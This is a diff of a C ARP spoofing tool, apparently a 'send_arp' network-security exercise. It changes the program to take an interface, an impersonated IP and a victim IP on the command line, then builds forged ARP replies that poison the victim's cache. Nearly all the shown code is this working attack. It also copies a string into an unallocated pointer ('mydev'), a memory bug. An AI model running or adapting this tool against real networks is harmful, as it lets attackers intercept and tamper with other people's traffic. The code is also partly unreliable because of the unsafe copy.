@@ -14,17 +14,16 @@ struct tmp_ip{
 };
 
 void usage(void){
-	printf("./main <victim's ip>\n");
+	printf("syntax: send_arp <interface> <send ip> <target ip>");
 }
 
 void print_mac(char * mac);
 void get_victim_mac( 
 	char * victim_ip,char * victim_mac,
 	char * my_ip, char * my_mac);
-
 void send_fake_reply(
 	char * victim_ip,char * victim_mac,
-	char * src_ip, char * my_mac);
+	char * send_ip, char * my_mac);
 
 char * mydev;
 pcap_t * handler;
@@ -33,22 +32,20 @@ int main(int argc, char * argv[]){
 
 	char victim_mac[6] = {};
 
-	if (argc != 2) {
+	if (argc != 4) {
 		usage();
 		exit(1);
 	}
 
 	char victim_ip[20];
-	strncpy(victim_ip,argv[1],18);
+	char send_ip[20];
+	strncpy(victim_ip,argv[3],18);
+	strncpy(mydev,argv[1],10);
+	strncpy(send_ip,argv[2],18);
 
-	printf("Victim's IP : %s\n", victim_ip);
-
-	mydev = pcap_lookupdev(NULL);
-	if (mydev==NULL){
-		puts("pcap_lookupdev ERROR!");
-		exit(1);
-	}
 	printf("My Dev : %s\n", mydev);
+	printf("Victim's IP : %s\n", victim_ip);
+	printf("Send IP : %s\n",send_ip);
 
 	pcap_if_t * alldevs;
 
@@ -102,11 +99,10 @@ int main(int argc, char * argv[]){
 		my_ip,
 		my_mac);
 
-	char gateway_ip[] = "192.168.0.1";
 	send_fake_reply(
 		victim_ip,
 		victim_mac,
-		gateway_ip,
+		send_ip,
 		my_mac);
 
 
@@ -114,7 +110,7 @@ int main(int argc, char * argv[]){
 
 void send_fake_reply(
 	char * victim_ip,char * victim_mac,
-	char * src_ip, char * my_mac)
+	char * send_ip, char * my_mac)
 {
 	struct libnet_ethernet_hdr * eth_hdr = 0;
 	char packet_s[PACKET_SIZE+1]={};
@@ -142,7 +138,7 @@ void send_fake_reply(
 		sizeof(struct libnet_arp_hdr));
 
 	memcpy(ip_info->sender_mac,my_mac,6);
-	inet_pton(AF_INET, src_ip, &ip_info->sender_ip);
+	inet_pton(AF_INET, send_ip, &ip_info->sender_ip);
 	memcpy(ip_info->target_mac,victim_mac,6);
 	inet_pton(AF_INET, victim_ip,&ip_info->target_ip);
 
@@ -231,6 +227,7 @@ void get_victim_mac(
 	memcpy(victim_mac,ip_info->sender_mac,6);
 
 }
+
 void print_mac(char * mac){
 	printf("%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx\n",
 		mac[0],mac[1],mac[2],
